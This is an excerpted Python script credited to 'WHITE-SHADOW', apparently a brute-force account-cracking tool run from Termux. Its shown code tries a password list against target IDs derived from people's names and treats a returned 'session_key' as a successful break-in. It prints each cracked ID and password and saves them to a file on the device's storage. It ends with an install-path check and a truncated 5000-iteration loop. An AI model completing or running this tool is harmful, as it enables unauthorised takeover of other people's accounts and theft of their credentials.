#SOURCE BY : WHITE-SHADOW
#GITHUB : ITX-WHITE-SHADOW
#coding = utf-8
...
logo= f'''
db   d8b   db db   db d888888b d888888b d88888b      .d8888. db   db  .d8b.  d8888b.  .d88b.  db   d8b   db 
88   I8I   88 88   88   `88'   `~~88~~' 88'          88'  YP 88   88 d8' `8b 88  `8D .8P  Y8. 88   I8I   88 
88   I8I   88 88ooo88    88       88    88ooooo      `8bo.   88ooo88 88ooo88 88   88 88    88 88   I8I   88 
Y8   I8I   88 88~~~88    88       88    88~~~~~        `Y8b. 88~~~88 88~~~88 88   88 88    88 Y8   I8I   88 
`8b d8'8b d8' 88   88   .88.      88    88.          db   8D 88   88 88   88 88  .8D `8b  d8' `8b d8'8b d8' 
 `8b8' `8d8'  YP   YP Y888888P    YP    Y88888P      `8888Y' YP   YP YP   YP Y8888D'  `Y88P'   `8b8' `8d8'  
                                                              
{50*"-"}
    Tool Version :     0.0.1
    Thanks Alot  :     White - Shadow
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[WHITE-SHADOW] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[WHITE-SHADOW-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/WHITE-SHADOW_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/WHITE-SHADOW_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/WHITE-SHADOW' in datar:
        pass
else:
        for i in range(5000):
